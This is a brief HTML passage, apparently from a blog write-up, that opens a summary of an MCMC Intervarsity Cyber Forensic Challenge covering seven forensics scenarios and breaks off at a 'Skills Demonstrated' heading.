 <h2 id="Summary-Key-Findings"><a href="#Summary-Key-Findings" class="headerlink" title="Summary &amp; Key Findings"></a>Summary &amp; Key Findings</h2><p>This MCMC Intervarsity Cyber Forensic Challenge tested comprehensive digital forensics skills across seven distinct scenarios. The challenges covered:</p>
 <h3 id="Skills-Demonstrated"><a href="#Skills-Demonstrated" class="headerlink" title="Skills Demonstrated"></a>Skills Demonstrated</h3><ol>
